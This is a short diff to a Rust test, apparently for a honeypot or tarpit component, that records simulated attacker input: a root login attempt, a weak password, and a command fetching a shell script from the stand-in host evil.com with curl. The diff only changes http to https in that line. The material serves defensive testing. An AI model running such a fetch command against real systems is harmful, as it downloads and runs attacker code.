@@ -961,7 +961,7 @@ mod tests {
         let rec1 = registry.record_tarpit_event(pid, trap_id, b"USER root", 1_000_000);
         let rec2 = registry.record_tarpit_event(pid, trap_id, b"PASS 123456", 2_000_000);
         let rec3 =
-            registry.record_tarpit_event(pid, trap_id, b"CMD curl http://evil.com/sh", 3_000_000);
+            registry.record_tarpit_event(pid, trap_id, b"CMD curl https://evil.com/sh", 3_000_000);
 
         assert_eq!(rec1.seq, 1);
         assert_eq!(rec2.seq, 2);
